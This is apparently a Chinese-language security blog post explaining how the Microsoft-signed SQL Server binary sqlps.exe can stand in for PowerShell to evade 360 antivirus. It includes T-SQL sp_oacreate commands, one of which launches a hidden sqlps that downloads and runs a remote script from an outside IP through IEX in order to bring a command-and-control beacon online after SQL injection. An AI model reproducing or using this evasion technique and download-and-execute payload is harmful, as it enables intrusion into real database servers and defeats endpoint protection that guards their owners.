---
title: sqlps替代powershell
tags: bypass
---

## 0x00 前言

sql server 默认安装后，会发现有一个 sqlps.exe：

![image-20220315190210816](https://gitee.com/tboom_is_here/pic/raw/master/2021-10-21/20220315190210.png)

此文件本身自带微软签名：

![image-20220315190237951](https://gitee.com/tboom_is_here/pic/raw/master/2021-10-21/20220315190237.png)

sqlps的功能，竟然是！启动 powershell？？？

![image-20220315190322987](https://gitee.com/tboom_is_here/pic/raw/master/2021-10-21/20220315190323.png)

**而且由于此文件无依赖，因此可以单独取出在无sql server机器上运行**。

## 0x01 sqlps 上线

之前使用 powershell 上线，360 必拦截：

![image-20220315191524076](https://gitee.com/tboom_is_here/pic/raw/master/2021-10-21/20220315191524.png)

使用sqlps，360无反应且能正常上线：

![image-20220315191648516](https://gitee.com/tboom_is_here/pic/raw/master/2021-10-21/20220315191648.png)



![image-20220315191725621](https://gitee.com/tboom_is_here/pic/raw/master/2021-10-21/20220315191725.png)

## 0x02 sp_oacreate

sql server 注入后提权的方法比较多，但是被杀软拦截的也比较厉害，xp_cmdshell会被拦，sp_oacreate也会被拦。

```
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:/windows/system32/cmd.exe'
```

![image-20220315192329929](https://gitee.com/tboom_is_here/pic/raw/master/2021-10-21/20220315192329.png)

```
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\Users\Public\SQLPS.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://192.168.80.138:80/a''))"'
```

![image-20220315193426383](https://gitee.com/tboom_is_here/pic/raw/master/2021-10-21/20220315193426.png)

成功上线，弊端是 sql server 默认为service权限，因此对很多目录包括sql server 默认目录都无法执行该程序，因此要提前上传sqlps至C:\Users\Public目录。
